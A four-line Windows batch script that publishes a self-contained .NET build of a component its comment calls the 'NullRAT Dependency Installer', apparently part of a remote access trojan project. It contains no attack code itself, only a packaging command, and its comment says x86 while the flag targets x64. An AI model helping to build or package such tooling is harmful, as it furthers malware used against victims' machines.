@echo off

:: Publish NullRAT Dependency Installer 
:: for Windows x86 | Self Contained & Trimmed
dotnet publish "Dependencies.csproj" --output build\ -r win-x64 -c release --self-contained true